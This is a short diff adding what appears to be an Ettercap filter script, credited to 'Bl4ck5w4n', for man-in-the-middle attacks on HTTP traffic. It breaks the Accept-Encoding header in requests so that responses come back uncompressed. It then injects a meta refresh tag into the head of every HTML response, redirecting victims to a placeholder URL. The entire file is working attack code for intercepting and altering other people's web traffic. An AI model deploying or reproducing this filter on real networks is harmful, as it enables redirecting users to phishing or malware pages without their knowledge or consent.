@@ -1,0 +1,17 @@
+# Author: Bl4ck5w4n ||
+# Description: This filter redirects all pages to a single page ||
+# Type: Single ||
+
+
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	  msg("zapped Accept-Encoding!\n");
+   }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("</HEAD>", "<META http-equiv=\"refresh\" content=\"0;URL=REPLACE_ME\"></HEAD");
+	replace("</head>", "<META http-equiv=\"refresh\" content=\"0;URL=REPLACE_ME\"></head>");
+	msg("redirect success\n");
+} 
